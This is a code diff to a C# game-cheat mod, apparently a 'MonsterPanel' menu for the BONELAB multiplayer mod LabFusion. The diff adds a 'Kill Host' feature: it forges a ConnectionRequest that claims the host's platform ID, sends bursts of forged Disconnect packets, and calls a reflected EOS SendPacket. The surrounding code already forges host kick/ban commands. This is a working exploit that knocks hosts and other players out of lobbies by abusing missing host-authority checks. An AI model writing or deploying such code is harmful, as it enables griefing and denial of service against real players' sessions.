@@ -1,7 +1,11 @@
 using System;
 using System.Collections;
+using System.Reflection;
 using System.Text;
 using BoneLib.BoneMenu;
+using HarmonyLib;
+using LabFusion;
+using LabFusion.Data;
 using LabFusion.Network;
 using LabFusion.Network.Serialization;
 using LabFusion.Player;
@@ -14,8 +18,9 @@ namespace MonsterPanel
 {
     /// <summary>
     /// Remote Action: lobby player list → Kick / Ban (forged host PermissionCommand on EOS).
-    /// Kill Host: forged Disconnect to host PlatformID via SendFromServer (EOS has no IsHost gate).
-    /// BoneMenu: maxElements=0 + deferred rebuild (same Quest GUIPool-safe pattern as Kill Aura / Teleport).
+    /// Kill Host: forge ConnectionRequest with host PlatformID → host SendConnectionDeny(self)
+    /// (Disconnect + TimeoutDisconnect/KickMember). Direct Disconnect SendFromServer kept as backup.
+    /// BoneMenu: maxElements=0 + deferred rebuild (Quest GUIPool-safe).
     /// </summary>
     internal static class RemoteAction
     {
@@ -26,6 +31,10 @@ namespace MonsterPanel
         private static bool _hooked;
         private static bool _rebuildQueued;
         private static float _nextActionTime;
+
+        // Cached EOSMessenger.SendPacket(ProductUserId, NetMessage, NetworkChannel, bool)
+        private static MethodInfo _eosSendPacket;
+        private static bool _eosSendLookupDone;
 
         public static void Install(Page root)
         {
@@ -251,14 +260,27 @@ namespace MonsterPanel
                     return;
                 }
 
-                if (!ForgeDisconnect(host.PlatformID, "Kicked from Server"))
+                string hostPid = host.PlatformID;
+                int ok = 0;
+
+                // Primary: ConnectionRequest with BackupPlatformID = host.
+                // Host sees "already in server" → SendConnectionDeny(host) →
+                // Disconnect to self + TimeoutDisconnect/KickMember. Uses working ToServer path.
+                if (ForgeHostSelfDeny(hostPid))
+                    ok++;
+
+                // Backup: direct ClientsOnly Disconnect via SendFromServer (+ raw EOS delayed).
+                if (ForgeDisconnectBurst(hostPid, "Kicked from Server"))
+                    ok++;
+
+                if (ok <= 0)
                 {
-                    Notify("Kill Host", "Send failed (EOS only).", error: true);
+                    Notify("Kill Host", "Send failed.", error: true);
                     return;
                 }
 
-                MelonLogger.Msg("Remote Action: Kill Host (forged Disconnect → host PlatformID).");
-                Notify("Kill Host", "Disconnect sent to host.");
+                MelonLogger.Msg($"Kill Host: sent ({ok} paths) pid={TrimId(hostPid)}");
+                Notify("Kill Host", "Kill Host sent.");
             }
             catch (Exception e)
             {
@@ -281,7 +303,7 @@ namespace MonsterPanel
                     OtherPlayer = otherPlayer
                 };
 
-                using NetWriter writer = NetWriter.Create(16);
+                using NetWriter writer = NetWriter.Create();
                 data.Serialize(writer);
                 using NetMessage message = NetMessage.Create(
                     NativeMessageTag.PermissionCommandRequest,
@@ -299,28 +321,209 @@ namespace MonsterPanel
         }
 
         /// <summary>
-        /// Craft Disconnect for host PlatformID and SendFromServer to that user.
-        /// EOSNetworkLayer.SendFromServer has no IsHost check — client can deliver ClientsOnly Disconnect.
+        /// Forge a join request claiming the host's PlatformID.
+        /// Host ConnectionRequest handler hits "already in the server" and
+        /// SendConnectionDeny(hostPlatformID) — same path host uses to deny joiners.
         /// </summary>
-        private static bool ForgeDisconnect(string platformId, string reason)
+        private static bool ForgeHostSelfDeny(string hostPlatformId)
         {
-            if (string.IsNullOrEmpty(platformId)) return false;
+            if (string.IsNullOrEmpty(hostPlatformId)) return false;
             try
             {
-                using NetWriter writer = NetWriter.Create(64);
-                DisconnectMessageData value = DisconnectMessageData.Create(platformId, reason ?? string.Empty);
-                NetSerializerExtensions.SerializeValue(writer, ref value);
-                using NetMessage message = NetMessage.Create(
-                    NativeMessageTag.Disconnect,
-                    writer,
-                    CommonMessageRoutes.None);
-                MessageSender.SendFromServer(platformId, NetworkChannel.Reliable, message);
+                string avatar = null;
+                try { avatar = RigData.GetAvatarBarcode(); } catch { /* */ }
+                if (string.IsNullOrEmpty(avatar))
+                    avatar = "SLZ.BONELAB.Content.Avatar.AnimePlayerDefault";
+
+                SerializedAvatarStats stats = null;
+                try { stats = RigData.RigAvatarStats; } catch { /* */ }
+                stats ??= new SerializedAvatarStats();
+
+                ConnectionRequestData data;
+                try
+                {
+                    data = ConnectionRequestData.Create(
+                        hostPlatformId,
+                        FusionMod.Version,
+                        avatar,
+                        stats);
+                }
+                catch
+                {
+                    // Create touches LocalPlayer metadata — fall back to a minimal payload.
+                    data = new ConnectionRequestData
+                    {
+                        BackupPlatformID = hostPlatformId,
+                        Version = FusionMod.Version,
+                        AvatarBarcode = avatar,
+                        AvatarStats = stats,
+                        InitialMetadata = new System.Collections.Generic.Dictionary<string, string>(),
+                        InitialEquippedItems = new System.Collections.Generic.List<string>(),
+                    };
+                }
+
+                // Exact ConnectionSender.SendConnectionRequest shape (Broadcast → ToServer on client).
+                using (NetWriter writer = NetWriter.Create())
+                {
+                    data.Serialize(writer);
+                    using NetMessage message = NetMessage.Create(
+                        NativeMessageTag.ConnectionRequest,
+                        writer,
+                        CommonMessageRoutes.None);
+                    MessageSender.BroadcastMessage(NetworkChannel.Reliable, message);
+                }
+
+                // Second copy via SendToServer in case Broadcast path differs.
+                using (NetWriter writer2 = NetWriter.Create())
+                {
+                    data.Serialize(writer2);
+                    using NetMessage message2 = NetMessage.Create(
+                        NativeMessageTag.ConnectionRequest,
+                        writer2,
+                        CommonMessageRoutes.None);
+                    MessageSender.SendToServer(NetworkChannel.Reliable, message2);
+                }
+
+                MelonLogger.Msg("Kill Host: forged ConnectionRequest (host self-deny).");
                 return true;
             }
             catch (Exception e)
             {
-                MelonLogger.Warning("Remote Action forge Disconnect: " + e.Message);
+                MelonLogger.Warning("Kill Host ConnectionRequest forge: " + e.Message);
                 return false;
+            }
+        }
+
+        /// <summary>
+        /// Backup: Disconnect payload for host PlatformID, delivered client→host (channel 1).
+        /// Also raw EOS send with AllowDelayedDelivery + MessageSender.SendFromServer burst.
+        /// </summary>
+        private static bool ForgeDisconnectBurst(string platformId, string reason)
+        {
+            if (string.IsNullOrEmpty(platformId)) return false;
+            bool any = false;
+            string reasonSafe = reason ?? string.Empty;
+
+            for (int i = 0; i < 3; i++)
+            {
+                if (ForgeDisconnectOnce(platformId, reasonSafe))
+                    any = true;
+            }
+
+            // Also poke every lobby peer with "host left" so clients drop host from list
+            // if the host packet is the only one that fails (does not replace host leave).
+            try
+            {
+                foreach (PlayerID id in PlayerIDManager.PlayerIDs)
+                {
+                    if (id == null || !id.IsValid || string.IsNullOrEmpty(id.PlatformID)) continue;
+                    if (id.IsMe) continue;
+                    ForgeDisconnectOnce(platformId, reasonSafe, deliverTo: id.PlatformID);
+                }
+            }
+            catch { /* */ }
+
+            return any;
+        }
+
+        private static bool ForgeDisconnectOnce(string payloadPlatformId, string reason, string deliverTo = null)
+        {
+            string target = deliverTo ?? payloadPlatformId;
+            if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(payloadPlatformId))
+                return false;
+
+            try
+            {
+                // Exact ConnectionSender.SendConnectionDeny serialization.
+                using (NetWriter writer = NetWriter.Create())
+                {
+                    DisconnectMessageData disconnect = DisconnectMessageData.Create(payloadPlatformId, reason);
+                    writer.SerializeValue(ref disconnect);
+                    using NetMessage message = NetMessage.Create(
+                        NativeMessageTag.Disconnect,
+                        writer,
+                        CommonMessageRoutes.None);
+                    MessageSender.SendFromServer(target, NetworkChannel.Reliable, message);
+                    TryEosSendPacket(target, message, isServerHandled: false);
+                }
+
+                // Host SmallID overload when delivering to host.
+                if (deliverTo == null)
+                {
+                    using NetWriter writer = NetWriter.Create();
+                    DisconnectMessageData disconnect = DisconnectMessageData.Create(payloadPlatformId, reason);
+                    writer.SerializeValue(ref disconnect);
+                    using NetMessage message = NetMessage.Create(
+                        NativeMessageTag.Disconnect,
+                        writer,
+                        CommonMessageRoutes.None);
+                    MessageSender.SendFromServer(HostSenderId, NetworkChannel.Reliable, message);
+                }
+
+                return true;
+            }
+            catch (Exception e)
+            {
+                MelonLogger.Warning("Kill Host Disconnect forge: " + e.Message);
+                return false;
+            }
+        }
+
+        private static void TryEosSendPacket(string platformId, NetMessage message, bool isServerHandled)
+        {
+            try
+            {
+                EnsureEosSendPacket();
+                if (_eosSendPacket == null || message == null) return;
+
+                Type puidType = AccessTools.TypeByName("Epic.OnlineServices.ProductUserId");
+                if (puidType == null) return;
+
+                MethodInfo fromString = AccessTools.Method(puidType, "FromString", new[] { typeof(string) });
+                if (fromString == null) return;
+
+                object userId = fromString.Invoke(null, new object[] { platformId });
+                if (userId == null) return;
+
+                // EOSMessenger.SendPacket(ProductUserId, NetMessage, NetworkChannel, bool)
+                _eosSendPacket.Invoke(null, new object[] { userId, message, NetworkChannel.Reliable, isServerHandled });
+            }
+            catch (Exception e)
+            {
+                MelonLogger.Warning("Kill Host EOS SendPacket: " + e.Message);
+            }
+        }
+
+        private static void EnsureEosSendPacket()
+        {
+            if (_eosSendLookupDone) return;
+            _eosSendLookupDone = true;
+            try
+            {
+                Type messenger = AccessTools.TypeByName("LabFusion.Network.EpicGames.EOSMessenger");
+                if (messenger == null)
+                {
+                    MelonLogger.Warning("Kill Host: EOSMessenger not found.");
+                    return;
+                }
+
+                foreach (MethodInfo m in messenger.GetMethods(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public))
+                {
+                    if (m.Name != "SendPacket") continue;
+                    ParameterInfo[] p = m.GetParameters();
+                    if (p.Length == 4 && p[1].ParameterType == typeof(NetMessage) && p[3].ParameterType == typeof(bool))
+                    {
+                        _eosSendPacket = m;
+                        break;
+                    }
+                }
+
+                if (_eosSendPacket == null)
+                    MelonLogger.Warning("Kill Host: EOSMessenger.SendPacket not found.");
+            }
+            catch (Exception e)
+            {
+                MelonLogger.Warning("Kill Host EOS lookup: " + e.Message);
             }
         }
 
@@ -340,6 +543,12 @@ namespace MonsterPanel
         {
             try { return NetworkInfo.HasServer; }
             catch { return false; }
+        }
+
+        private static string TrimId(string id)
+        {
+            if (string.IsNullOrEmpty(id)) return "?";
+            return id.Length <= 8 ? id : id.Substring(0, 8);
         }
 
         private static string SafeName(PlayerID id)
